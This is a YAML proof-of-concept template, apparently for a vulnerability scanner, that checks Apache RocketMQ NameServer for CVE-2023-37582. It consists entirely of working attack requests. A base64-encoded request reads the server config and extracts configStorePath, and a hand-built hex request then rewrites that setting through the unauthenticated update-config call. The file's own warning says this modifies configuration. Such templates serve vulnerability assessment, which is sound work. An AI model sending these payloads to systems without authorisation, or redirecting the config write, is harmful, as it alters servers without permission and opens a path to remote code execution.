name: yaml-poc-apache-rocketmq_namesrv-rce-CVE-2023-37582
binding: f566b40d-bfd0-4993-936a-919c72893e35
manual: false
detail:
    author: jiahao.sun
    links:
        - http://www.openwall.com/lists/oss-security/2023/07/12/1
        - https://avd.aliyun.com/detail?id=AVD-2023-37582
        - https://github.com/apache/rocketmq/pull/6843
        - https://lists.apache.org/thread/m614czxtpvlztd7mfgcs2xcsg36rdbnc
        - https://nvd.nist.gov/vuln/detail/CVE-2023-37582
    vulnerability:
        id: 3e33a0b3-c9f9-42cc-8c07-0acb81bd3cf7
        level: critical
    warning: Config Modification
transport: tcp
set:
    config: base64Decode("AAAAZQAAAGF7ImNvZGUiOjMxOSwiZmxhZyI6MCwibGFuZ3VhZ2UiOiJKQVZBIiwib3BhcXVlIjowLCJzZXJpYWxpemVUeXBlQ3VycmVudFJQQyI6IkpTT04iLCJ2ZXJzaW9uIjo0MDV9")
rules:
    r0:
        request:
            cache: true
            content: '{{config}}'
            read_timeout: "3"
        expression: response.raw.bcontains(b"\"code\":0") && response.raw.bcontains(b"serializeTypeCurrentRPC")
        output:
            search: '"configStorePath=(?P<path>.+?)\n".bsubmatch(response.raw)'
            configStorePath: search["path"]
            len: int(size(hex(string("configStorePath=") + configStorePath)))
            total_length: int(4 + int(len / 2) + 97)
            total_length_hex: rev(string("00000000") + substr(decToHex(total_length), 0, 10))
            data: rev(substr(total_length_hex, 0, 8)) + string("000000617b22636f6465223a3331382c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3430357d636f6e66696753746f7265506174683d") + hex(configStorePath)
            configs: hexDecode(data)
    r1:
        request:
            cache: true
            content: '{{configs}}'
            read_timeout: "3"
        expression: response.raw.bcontains(b"\"code\":0") && response.raw.bcontains(b"serializeTypeCurrentRPC")
expression: r0() && r1()
